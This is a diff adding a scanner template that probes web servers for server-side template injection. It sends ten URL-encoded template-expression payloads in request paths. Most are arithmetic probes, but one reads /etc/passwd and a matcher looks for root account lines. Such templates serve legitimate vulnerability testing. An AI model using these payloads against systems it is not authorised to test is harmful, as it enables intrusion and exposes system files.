@@ -1,0 +1,84 @@
+id: generic-ssti
+
+info:
+  name: Server Side Template Injection Detect
+  author: pwnhxl
+  severity: high
+  reference:
+    - http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0189837
+  tags: generic,ssti
+
+variables:
+  first: "{{rand_int(1000, 9999)}}"
+  second: "{{rand_int(1000, 9999)}}"
+  result: "{{to_number(first)*to_number(second)}}"
+  payload1: '{{url_encode(concat("{{eval(", "{{first}}*{{second}}", "))}}"))}}'
+  payload2: '{{url_encode(concat("#{", "{{first}}*{{second}}", "}"))}}'
+  payload3: '{{url_encode(concat("${", "{{first}}*{{second}}", "}"))}}'
+  payload4: '{{url_encode(concat("{{", "{{first}}*{{second}}", "}}"))}}'
+  payload5: '{{url_encode(concat("{", "{{first}}*{{second}}", "}"))}}'
+  payload6: '{{url_encode(concat("#{{", "{{first}}*{{second}}", "}}"))}}'
+  payload7: '{{url_encode(concat("${{", "{{first}}*{{second}}", "}}"))}}'
+  payload8: "{{url_encode({{open('/etc/passwd').read()}})}}"
+  payload9: '{{url_encode(concat("[[", "{{first}}*{{second}}", "]]"))}}'
+  payload10: '{{url_encode(concat("<%=", "{{first}}*{{second}}", "%>"))}}'
+
+requests:
+  - raw:
+      - |
+        GET /{{payload1}}/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{payload2}}/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{payload3}}/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{payload4}}/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{payload5}}/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{payload6}}/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{payload7}}/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{payload7}}/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{payload8}}/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{payload9}}/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{payload10}}/ HTTP/1.1
+        Host: {{Hostname}}
+
+    skip-variables-check: true
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{result}}"
+
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
